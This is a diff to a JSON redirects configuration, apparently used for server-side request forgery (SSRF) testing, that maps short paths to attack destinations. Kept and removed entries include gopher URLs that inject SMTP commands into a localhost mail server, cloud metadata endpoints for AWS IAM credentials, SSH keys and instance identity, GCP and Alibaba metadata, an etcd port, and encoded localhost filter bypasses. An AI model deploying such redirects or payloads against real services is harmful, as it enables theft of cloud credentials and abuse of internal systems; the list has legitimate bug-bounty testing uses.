@@ -1,5 +1,4 @@
 {"redirects": [
-    { "source": "/og124", "destination": "gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"},
     { "source": "/og125", "destination": "http://169.254.169.254"},
     { "source": "/og126", "destination": "http://metadata.nicob.net/"},
     { "source": "/og127", "destination": "http://169.254.169.254.nip.io/"},
@@ -57,22 +56,6 @@
     { "source": "/og179", "destination": "http://127.1.1.1:80:\@@127.2.2.2:80/"},
     { "source": "/og180", "destination": "http://127.1.1.1:80#\@127.2.2.2:80/"},
     { "source": "/og181", "destination": "http://mail.ebc.apple.com"},
-    { "source": "/og182", "destination": "http://bugbounty.dod.network"},
-    { "source": "/og183", "destination": "gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Creport@securityrise.com%3E%250d%250aRCPT%20TO%3A%3Cw2w@wearehackerone.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cw2w@wearehackerone.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"},
-    { "source": "/og184", "destination": "http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]"},
-    { "source": "/og185", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]"},
-    { "source": "/og186", "destination": "http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key"},
-    { "source": "/og187", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access"},
-    { "source": "/og188", "destination": "http://169.254.169.254/latest/dynamic/instance-identity/document"},
-    { "source": "/og189", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role"},
-    { "source": "/og190", "destination": "http://metadata.google.internal/computeMetadata/v1/instance/id"},
-    { "source": "/og191", "destination": "http://metadata.google.internal/computeMetadata/v1/project/project-id"},
-    { "source": "/og192", "destination": "http://100.100.100.200/latest/meta-data/instance-id"},
-    { "source": "/og193", "destination": "http://100.100.100.200/latest/meta-data/image-id"},
-    { "source": "/og194", "destination": "http://127.0.0.1:2379/version"},
-    { "source": "/og195", "destination": "http://127.1:80"},
-    { "source": "/og196", "destination": "http://0"},
-    { "source": "/og197", "destination": "http://[0000::1]:80/"},
-    { "source": "/og198", "destination": "http://[0:0:0:0:0:ffff:127.0.0.1]/"}
+    { "source": "/og182", "destination": "http://bugbounty.dod.network"}
   ]
 }
